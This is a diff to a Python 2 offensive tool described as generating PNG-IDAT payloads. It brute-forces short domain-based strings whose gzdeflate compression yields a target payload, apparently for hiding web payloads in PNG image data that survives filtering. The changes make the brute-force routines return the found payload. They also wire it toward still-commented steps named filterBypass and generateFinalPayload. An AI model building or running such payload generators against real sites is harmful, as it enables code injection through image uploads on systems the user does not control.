@@ -13,6 +13,7 @@ Payloads:
 import argparse
 import zlib
 import time
+from threading import Thread
 
 #args
 parser = argparse.ArgumentParser(description="Tool to generate PNG-IDAT Payloads.")
@@ -59,13 +60,16 @@ def calcBruteMethod(remoteDomain, prefix, tld):
 	
 	if tld == "BZ":
 		print "[+]Known tld detected, trying fast method!"
-		aLouge(targetPayload, prefix)
-	if tld == "PE":
+		gzdeflatePayload = aLouge(targetPayload, prefix)
+		return gzdeflatePayload
+	elif tld == "PE":
 		print "[+]Known tld detected, trying fast method!"
-		fin1te(targetPayload, prefix)
-	if tld == "CZ":
+		gzdeflatePayload = fin1te(targetPayload, prefix)
+		return gzdeflatePayload
+	elif tld == "CZ":
 		print "[+]Known tld detected, trying fast method!"
-		vavkamil(targetPayload, prefix)
+		gzdeflatePayload = vavkamil(targetPayload, prefix)
+		return gzdeflatePayload
 	else:
 		print "[+] Unknown tld, attempting slow method"
 		vakamilBrute(targetPayload, prefix, tld)
@@ -79,13 +83,14 @@ def aLouge(targetPayload, prefix):
 	end = 0xffffff
 	keyspace = end-start
 	print "[-]Calculated Keyspace: %s" % str(keyspace)
+	raw_input("[*]Press Any Key to Begin Bruteforce")
 
 	#BruteForce	
 	print "[+]Starting Gzdeflate Payload Bruteforce..."
 	i=1
 	while start < end:
-		if i % 500000 == 0:
-			print "[-]Guess:",str(i)+"/"+str(keyspace), "--", "Left:",str(keyspace-i)
+		if i % 100000 == 0:
+			print "[-]Guess: %s/%s -- Left: %s" % (i,keyspace,keyspace-i)
 		brute = hex(start).encode('ascii')[2:]
 		if "L" in brute:
 			brute = brute[:-1]
@@ -96,9 +101,11 @@ def aLouge(targetPayload, prefix):
 			print "[!]GZDEFLATE PAYLOAD FOUND!"
 			print "Gzdeflate Payload String: %s" % repr(deflate)
 			print "Gzdeflate Payload: %s" % guess
-			break
-		else:
-			start += 1
+			return deflate
+		start += 1
+		i+=1
+	return False
+
 def vavkamil(remoteDomain, prefix, tld):
 	#todo
 	return
@@ -138,4 +145,9 @@ if __name__ == '__main__':
 	if len(prefix) > 3:
 		print "Domains larger than 3 chars not supported yet!"
 	else:
-		calcBruteMethod(remoteDomain, prefix, tld)			
+		gzdeflatePayload = calcBruteMethod(remoteDomain, prefix, tld)
+	if not gzdeflatePayload:
+		print "[+] Payload Failed to Generate...exiting"
+		sys.exit(0)
+	#payload = filterBypass(gzdeflatePayload)
+	#generateFinalPayload(payload)
